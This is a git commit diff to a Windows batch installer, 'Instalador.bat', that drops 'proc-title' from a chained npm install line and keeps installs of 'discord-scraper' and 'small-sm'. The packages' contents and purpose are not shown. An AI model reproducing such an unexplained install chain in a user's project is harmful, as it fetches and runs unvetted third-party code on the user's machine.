50255c66d0b620b71d7b7977910abb67e42acbf9
PolarLofy <75093985+PolarLofy@users.noreply.github.com>
2022-07-17 17:54:54 -0300

    Update [1] Instalador.bat

--- [1] Instalador.bat
+++ [1] Instalador.bat
@@ -21,7 +21,7 @@ pause nul
 cls
 color B
 cls
-call npm i && npm i proc-title && npm i discord-scraper && npm i small-sm && npm i discord-scraper
+call npm i && npm i discord-scraper && npm i small-sm && npm i discord-scraper
 cls
 color C
 echo.
